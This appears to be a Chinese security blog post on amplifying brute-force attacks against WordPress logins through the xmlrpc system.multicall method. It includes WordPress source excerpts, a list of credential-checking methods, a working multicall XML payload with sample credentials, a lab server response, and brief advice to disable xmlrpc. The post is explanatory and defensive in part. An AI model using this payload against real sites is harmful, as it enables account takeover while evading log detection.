---
layout: post
title: "WordPress 利用xmlrpc中的system.multicall接口进行快速爆破"
tags: [security, web]
---

xmlrpc 是 WordPress 中进行远程调用的接口，而使用 xmlrpc 调用接口进行账号爆破在很早之前就被提出并加以利用。近日 [SUCURI](https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html) 发布文章介绍了利用 xmlrpc 调用接口中的 `system.multicall` 来提高爆破效率，使得成千上万次的帐号密码组合尝试能在一次请求完成，在一定程度上能够躲避日志的检测。

WordPress 中关于 xmlrpc 服务的定义代码主要位于 `wp-includes/class-IXR.php` 和 `wp-includes/class-wp-xmlrpc-server.php` 中。基类 IXR_Server 中定义了三个内置的调用方法，分别为 `system.getCapabilities`，`system.listMethods` 和 `system.multicall`，其调用映射位于 `IXR_Server` 基类定义中：

{% highlight php %}
function setCallbacks()
{
    $this->callbacks['system.getCapabilities'] = 'this:getCapabilities';
    $this->callbacks['system.listMethods'] = 'this:listMethods';
    $this->callbacks['system.multicall'] = 'this:multiCall';
}
{% endhighlight %}

而基类在初始化时，调用 setCallbacks() 绑定了调用映射关系：

{% highlight php %}
function __construct( $callbacks = false, $data = false, $wait = false )
{
    $this->setCapabilities();
    if ($callbacks) {
        $this->callbacks = $callbacks;
    }
    $this->setCallbacks();  // 绑定默认的三个基本调用映射
    if (!$wait) {
        $this->serve($data);
    }
}
{% endhighlight %}

再来看看 `system.multicall` 对应的处理函数：

{% highlight php %}
function multiCall($methodcalls)
{
    // See http://www.xmlrpc.com/discuss/msgReader$1208
    $return = array();
    foreach ($methodcalls as $call) {
        $method = $call['methodName'];
        $params = $call['params'];
        if ($method == 'system.multicall') {
            $result = new IXR_Error(-32600, 'Recursive calls to system.multicall are forbidden');
        } else {
            $result = $this->call($method, $params);
        }
        if (is_a($result, 'IXR_Error')) {
            $return[] = array(
                'faultCode' => $result->code,
                'faultString' => $result->message
            );
        } else {
            $return[] = array($result);
        }
    }
    return $return;
}
{% endhighlight %}

可以从代码中看出，程序会解析请求传递的 XML，遍历多重调用中的每一个接口调用请求，并会将最终有调用的结果合在一起返回给请求端。

这样一来，就可以将500种甚至是10000种帐号密码爆破尝试包含在一次请求中，服务端会很快处理完并返回结果，这样极大地提高了爆破的效率，利用多重调用接口压缩了请求次数，10000种帐号密码尝试只会在目标服务器上留下一条访问日志，一定程度上躲避了日志的安全检测。

通过阅读 WordPress 中 xmlrpc 相关处理的代码，能大量的 xmlrpc 调用都验证了用户名和密码：

{% highlight php %}
    if ( !$user = $this->login($username, $password) )
        return $this->error;
{% endhighlight %}

通过搜索上述登录验证代码可以得到所有能够用来进行爆破的调用方法列表如下： 

    wp.getUsersBlogs, wp.newPost, wp.editPost, 
    wp.deletePost, wp.getPost, wp.getPosts, 
    wp.newTerm, wp.editTerm, wp.deleteTerm, 
    wp.getTerm, wp.getTerms, wp.getTaxonomy, 
    wp.getTaxonomies, wp.getUser, wp.getUsers, 
    wp.getProfile, wp.editProfile, wp.getPage, 
    wp.getPages, wp.newPage, wp.deletePage, 
    wp.editPage, wp.getPageList, wp.getAuthors, 
    wp.getTags, wp.newCategory, wp.deleteCategory, 
    wp.suggestCategories, wp.getComment, wp.getComments, 
    wp.deleteComment, wp.editComment, wp.newComment, 
    wp.getCommentStatusList, wp.getCommentCount, wp.getPostStatusList, 
    wp.getPageStatusList, wp.getPageTemplates, wp.getOptions, 
    wp.setOptions, wp.getMediaItem, wp.getMediaLibrary, 
    wp.getPostFormats, wp.getPostType, wp.getPostTypes, 
    wp.getRevisions, wp.restoreRevision, blogger.getUsersBlogs, 
    blogger.getUserInfo, blogger.getPost, blogger.getRecentPosts, 
    blogger.newPost, blogger.editPost, blogger.deletePost, 
    mw.newPost, mw.editPost, mw.getPost, 
    mw.getRecentPosts, mw.getCategories, mw.newMediaObject, 
    mt.getRecentPostTitles, mt.getPostCategories, mt.setPostCategories
    
这里是用参数传递最少获取信息最直接的 `wp.getUsersBlogs` 进行测试，将两次帐号密码尝试包含在同一次请求里，构造 XML 请求内容为：

{% highlight xml %}
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param>
    <value><array><data>

      <value><struct>
        <member>
          <name>methodName</name>
          <value><string>wp.getUsersBlogs</string></value>
        </member>
        <member>
          <name>params</name>
          <value><array><data>
            <value><string>admin</string></value>
            <value><string>admin888</string></value>
          </data></array></value>
        </member>
      </struct></value>

      <value><struct>
        <member>
          <name>methodName</name>
          <value><string>wp.getUsersBlogs</string></value>
        </member>
        <member>
          <name>params</name>
          <value><array><data>
            <value><string>guest</string></value>
            <value><string>test</string></value>
          </data></array></value>
        </member>
      </struct></value>

    </data></array></value>
  </param></params>
</methodCall>
{% endhighlight %}

将上面包含两个子调用的 XML 请求发送至 xmlrpc 服务端入口，若目标开启了 xmlrpc 服务会返回类似如下的信息：

{% highlight xml %}
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><array><data>
  <value><array><data>
  <value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  <member><name>url</name><value><string>http://172.16.96.130/xampp/wordpress-4.3.1/</string></value></member>
  <member><name>blogid</name><value><string>1</string></value></member>
  <member><name>blogName</name><value><string>WordPress 4.3.1</string></value></member>
  <member><name>xmlrpc</name><value><string>http://172.16.96.130/xampp/wordpress-4.3.1/xmlrpc.php</string></value></member>
</struct></value>
</data></array></value>
</data></array></value>
  <value><struct>
  <member><name>faultCode</name><value><int>403</int></value></member>
  <member><name>faultString</name><value><string>用户名或密码不正确。</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
{% endhighlight %}

从结果中可以看到在同一次请求里面处理了两种帐号密码组合，并以集中形式将结果返回，通过该种方式可以极大地提高帐号爆破效率。

当然了，这里不仅要讨论如何进行攻击还要考虑如何去防御这种情况。最直接的方式就是直接关闭 xmlrpc 功能（当然了也可以直接删除xmlrpc.php文件），但是 WordPress 并没有在后台提供关闭 xmlrpc 的功能，但是站长用户可以通过插件或者编码的方式来禁用。(插件可以使用 [Disable XML-RPC](https://wordpress.org/plugins/disable-xml-rpc/)）

### 参考链接

* [https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html](https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html)
